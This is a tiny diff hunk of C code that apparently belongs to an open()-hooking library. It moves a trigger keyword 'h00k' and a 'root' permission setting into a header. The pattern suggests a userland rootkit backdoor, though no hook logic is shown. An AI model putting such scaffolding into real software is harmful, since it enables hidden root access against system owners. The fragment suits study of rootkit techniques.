@@ -15,8 +15,7 @@
 #include <sys/types.h>
 #include <pwd.h>
 
-#define keyword "h00k"
-#define permission "root"
+#include "h00k.h"
 
 //??
 int (*old_open)(const char *pathname, int flags, mode_t mode);
